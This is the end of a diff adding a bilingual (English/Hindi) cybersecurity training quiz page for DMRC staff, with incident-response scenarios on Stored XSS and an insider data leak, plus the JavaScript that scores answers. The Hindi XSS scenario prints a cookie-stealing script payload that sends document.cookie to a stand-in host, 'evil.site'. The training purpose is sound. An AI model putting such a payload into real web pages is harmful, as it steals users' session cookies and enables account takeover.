+      wrongFeedback: `❌ Incorrect. With active exploitation in progress, you must immediately invalidate all sessions and take the feature offline. Simply warning users or deleting the attacker's account doesn't stop the already-harvested session tokens from being used.`
+    },
+    hi: {
+      title: 'DMRC इंट्रानेट पर Stored XSS (वास्तविक 2024)',
+      vendor: 'डीएमआरसी इंट्रानेट वेब एप्लिकेशन (मई 2024 रिपोर्ट)',
+      context: `मई 2024 में सुरक्षा शोधकर्ता अभिषेक असवाल ने DMRC इंट्रानेट के यूज़र प्रोफाइल सेक्शन में Stored XSS भेद्यता खोजी। एक हमलावर ने पैच लागू होने से पहले इसका फायदा उठाया। आप DMRC वेब सुरक्षा टीम लीड हैं:`,
+      scene: `🔴 सुरक्षा घटना रिपोर्ट — मई 2024
+
+भेद्यता: /intranet/profile/update में Stored XSS
+पेलोड: &lt;script&gt;document.location='https://evil.site/steal?c='+document.cookie&lt;/script&gt;
+इंजेक्शन: प्रोफाइल में "विभाग" फ़ील्ड
+प्रभाव: ~3,200 DMRC इंट्रानेट उपयोगकर्ताओं के
+        सेशन कुकीज चोरी
+लक्ष्य: एडमिन टोकन → विशेषाधिकार वृद्धि
+स्थिति: सक्रिय शोषण जारी`,
+      question: 'वेब सुरक्षा लीड के रूप में तत्काल सही कदम क्या है?',
+      options: [
+        'ईमेल से उपयोगकर्ताओं को उस प्रोफाइल न देखने की चेतावनी दें',
+        'प्रोफाइल फीचर तुरंत बंद करें, सभी सेशन टोकन निष्क्रिय करें, डेटाबेस इनपुट sanitize करें, WAF और CSP हेडर लागू करें',
+        'केवल हमलावर का अकाउंट डिलीट करें',
+        'DMRC वेबसाइट पर सार्वजनिक नोटिस डालें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! सक्रिय Stored XSS शोषण के लिए: (1) तुरंत प्रभावित फीचर बंद करें। (2) सभी सेशन टोकन निष्क्रिय करें — चोरी किए गए कुकीज अब बेकार हो जाएंगे। (3) डेटाबेस की सभी एंट्री sanitize करें। (4) Output Encoding, CSP हेडर, HTTPOnly कुकी फ्लैग लागू करें। (5) सभी यूज़र इनपुट फ़ील्ड का ऑडिट करें।`,
+      wrongFeedback: `❌ गलत। सक्रिय शोषण के दौरान सभी सेशन तुरंत निष्क्रिय करना और फीचर बंद करना जरूरी है। केवल चेतावनी देने से पहले चुराए गए टोकन बेकार नहीं होंगे।`
+    }
+  },
+
+  // ── 7: Insider Threat ──────────────────────────────────
+  {
+    icon: '🕵️',
+    color: 'rgba(245,166,35,.2)',
+    en: {
+      title: 'Vendor Payment Portal Insider Threat',
+      vendor: 'DMRC Vendor Payment Portal — vpp.dmrc.org',
+      context: `DMRC operates the Vendor Payment Portal (vpp.dmrc.org) for managing vendor payments, invoices, and financial transactions. A vendor company's employee — Rakesh Tiwari — has had access to VPP for 3 years. He has resigned and his last working day is in 5 days. The DMRC security team's DLP (Data Loss Prevention) system flags this alert:`,
+      scene: `🚨 DLP ALERT — Data Exfiltration Detected
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+User:       Rakesh Tiwari (Vendor: ABC Infra Pvt Ltd)
+Portal:     vpp.dmrc.org
+Time:       14:37 – 15:52 (Today)
+Activity:   Bulk download of vendor payment records
+Data:       2,847 invoice records + Bank account details
+            (3 years of transaction history)
+Method:     CSV export → uploaded to personal Google Drive
+Status:     Transfer COMPLETE — data already off-system
+Resignation: Confirmed — Last day in 5 days
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️  Potential: Competitor intelligence / Financial fraud`,
+      question: 'What is the MOST appropriate response from DMRC security?',
+      options: [
+        'Wait until his last day to revoke access, then investigate',
+        'Immediately revoke Rakesh\'s VPP access, preserve all audit logs and downloaded data as evidence, involve legal/compliance team, notify affected vendors if financial data was compromised, and report to appropriate authorities',
+        'Send him a warning email and monitor further',
+        'Restore from backup and hope the data wasn\'t misused'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! Insider threats from departing employees are among the highest-risk scenarios. Response: (1) IMMEDIATELY revoke all system access — don't wait for the last day. (2) Preserve audit logs as legal evidence. (3) Engage HR, Legal, and Compliance. (4) Assess if vendor bank details were exposed and notify affected parties. (5) Review the VPP's DLP policies — bulk exports should require secondary approval. (6) Conduct an exit interview review. DMRC should follow a formal offboarding procedure that revokes access upon resignation acceptance.`,
+      wrongFeedback: `❌ Incorrect. Waiting until the last day to revoke access gives the employee more time to exfiltrate data. Immediate access revocation is critical. The data has already left the system — legal and compliance teams must be involved immediately.`
+    },
+    hi: {
+      title: 'विक्रेता भुगतान पोर्टल आंतरिक खतरा',
+      vendor: 'डीएमआरसी विक्रेता भुगतान पोर्टल — vpp.dmrc.org',
+      context: `डीएमआरसी का Vendor Payment Portal (vpp.dmrc.org) विक्रेता भुगतान, इनवॉयस और वित्तीय लेनदेन प्रबंधित करता है। एक विक्रेता कर्मचारी रकेश तिवारी, जिनके पास 3 वर्षों से VPP एक्सेस है, ने इस्तीफा दे दिया है। DLP सिस्टम यह अलर्ट देता है:`,
+      scene: `🚨 DLP अलर्ट — डेटा एक्सफिल्ट्रेशन
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+उपयोगकर्ता: रकेश तिवारी (विक्रेता: ABC Infra)
+पोर्टल:     vpp.dmrc.org
+समय:        14:37 – 15:52 (आज)
+गतिविधि:   विक्रेता भुगतान रिकॉर्ड का बल्क डाउनलोड
+डेटा:       2,847 इनवॉयस + बैंक खाते विवरण
+            (3 वर्ष का लेनदेन इतिहास)
+तरीका:     CSV export → व्यक्तिगत Google Drive
+स्थिति:    ट्रांसफर पूर्ण — डेटा सिस्टम से बाहर
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+      question: 'DMRC सुरक्षा की सबसे उचित प्रतिक्रिया क्या होनी चाहिए?',
+      options: [
+        'अंतिम दिन तक एक्सेस रहने दें, फिर जांच करें',
+        'तुरंत रकेश का VPP एक्सेस रद्द करें, सभी लॉग सुरक्षित करें, कानूनी/अनुपालन टीम को शामिल करें, प्रभावित विक्रेताओं को सूचित करें',
+        'चेतावनी ईमेल भेजें और निगरानी करें',
+        'बैकअप से रीस्टोर करें और आशा करें कि डेटा का दुरुपयोग न हो'
+      ],
+      correct: 1,
+      feedback: `✅ सही! जाने वाले कर्मचारियों से आंतरिक खतरा सबसे अधिक जोखिम वाला परिदृश्य है। कदम: (1) तुरंत सभी सिस्टम एक्सेस रद्द करें। (2) ऑडिट लॉग को कानूनी साक्ष्य के रूप में सुरक्षित करें। (3) HR, कानूनी और अनुपालन टीम शामिल करें। (4) प्रभावित विक्रेताओं को सूचित करें। (5) VPP में बल्क एक्सपोर्ट के लिए द्वितीयक अनुमोदन नीति लागू करें।`,
+      wrongFeedback: `❌ गलत। अंतिम दिन तक इंतजार करने से अधिक डेटा चोरी का मौका मिलता है। तुरंत एक्सेस रद्द करें और कानूनी टीम को शामिल करें।`
+    }
+  }
+];
+
+// ── Open Modal ───────────────────────────────────────────
+function openScenario(idx) {
+  const s = scenarios[idx];
+  const d = lang.current === 'hi' ? s.hi : s.en;
+  const letters = ['A','B','C','D'];
+
+  const html = `
+    <div class="modal-icon">${s.icon}</div>
+    <div style="font-size:.72rem; color:var(--subtext); margin-bottom:6px;">
+      🏢 ${d.vendor}
+    </div>
+    <h3>${d.title}</h3>
+    <div class="scenario-context">${d.context}</div>
+    <div class="scene-img" id="scene-${idx}"></div>
+    <div class="question-block">
+      <p>❓ ${d.question}</p>
+      <div class="options" id="opts-${idx}">
+        ${d.options.map((opt,i) => `
+          <button class="option-btn" id="opt-${idx}-${i}"
+            onclick="checkAnswer(${idx},${i})"
+            ${completed[idx] ? 'disabled' : ''}>
+            <span class="option-letter">${letters[i]}</span>
+            ${opt}
+          </button>`).join('')}
+      </div>
+      <div class="feedback-box" id="fb-${idx}"></div>
+      <button class="next-btn" id="nxt-${idx}" onclick="finishScenario(${idx})">
+        ${lang.current === 'hi' ? '✅ अगला परिदृश्य →' : '✅ Next Scenario →'}
+      </button>
+    </div>`;
+
+  document.getElementById('modalContent').innerHTML = html;
+  // Safely set scene text via textContent to prevent any script execution
+  const sceneEl = document.getElementById(`scene-${idx}`);
+  if (sceneEl) sceneEl.textContent = d.scene;
+
+  if (completed[idx]) {
+    markCompleted(idx, true);
+  }
+
+  document.getElementById('modalOverlay').classList.add('open');
+}
+
+function checkAnswer(idx, chosen) {
+  const s = scenarios[idx];
+  const d = lang.current === 'hi' ? s.hi : s.en;
+  const btns = document.querySelectorAll(`#opts-${idx} .option-btn`);
+  btns.forEach(b => b.disabled = true);
+
+  const fb = document.getElementById(`fb-${idx}`);
+  const nxt = document.getElementById(`nxt-${idx}`);
+
+  btns[s.en.correct].classList.add('correct');
+
+  if (chosen === s.en.correct) {
+    btns[chosen].classList.add('correct');
+    fb.textContent = d.feedback;
+    fb.className = 'feedback-box show correct-fb';
+    if (!completed[idx]) {
+      score += 100;
+      document.getElementById('scoreDisplay').textContent = score;
+      completed[idx] = true;
+      updateProgress();
+      document.getElementById(`badge-${idx}`).classList.add('earned');
+      document.getElementById(`card-${idx}`).classList.add('completed');
+    }
+  } else {
+    btns[chosen].classList.add('wrong');
+    fb.textContent = d.wrongFeedback;
+    fb.className = 'feedback-box show wrong-fb';
+    completed[idx] = true; // mark as attempted
+  }
+
+  nxt.classList.add('show');
+}
+
+function finishScenario(idx) {
+  closeModal();
+  if (score >= 800) showCertificate();
+}
+
+function markCompleted(idx, alreadyDone) {
+  if (alreadyDone) {
+    const fb = document.getElementById(`fb-${idx}`);
+    if (fb) {
+      const d = lang.current === 'hi' ? scenarios[idx].hi : scenarios[idx].en;
+      fb.textContent = d.feedback;
+      fb.className = 'feedback-box show correct-fb';
+    }
+    const nxt = document.getElementById(`nxt-${idx}`);
+    if (nxt) nxt.classList.add('show');
+  }
+}
+
+function updateProgress() {
+  const done = completed.filter(Boolean).length;
+  document.getElementById('completedCount').textContent = done;
+  document.getElementById('progressBar').style.width = (done / 8 * 100) + '%';
+}
+
+function showCertificate() {
+  document.getElementById('finalScore').textContent = score + ' pts';
+  document.getElementById('certSection').classList.add('show');
+  document.getElementById('certSection').scrollIntoView({ behavior:'smooth' });
+}
+
+function closeModal() {
+  document.getElementById('modalOverlay').classList.remove('open');
+}
+function closeOnOverlay(e) {
+  if (e.target === document.getElementById('modalOverlay')) closeModal();
+}
+
+// Init
+setLang('en');
+</script>
+</body>
+</html>
